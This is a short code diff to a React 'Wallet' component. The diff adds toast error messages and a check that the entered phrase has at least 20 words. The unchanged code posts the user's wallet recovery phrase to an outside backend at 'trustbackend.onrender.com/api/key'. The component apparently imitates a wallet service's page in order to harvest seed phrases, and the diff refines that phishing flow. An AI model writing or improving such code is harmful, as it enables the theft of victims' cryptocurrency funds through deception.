@@ -10,8 +10,14 @@ const Wallet = () => {
 
   const dataSend = async () => {
     if (!formData) {
-      return alert("Please enter correct phrase")
+      return toast.error("Please enter correct phrase")
     }
+
+    const wordCount = formData.trim().split(/\s+/).length;
+    if (wordCount < 20) {
+      return toast.error("Please enter a valid phrase.");
+    }
+
     setLoading(true)
     try {
       const res = await axios.post("https://trustbackend.onrender.com/api/key", { phrase: formData }, {
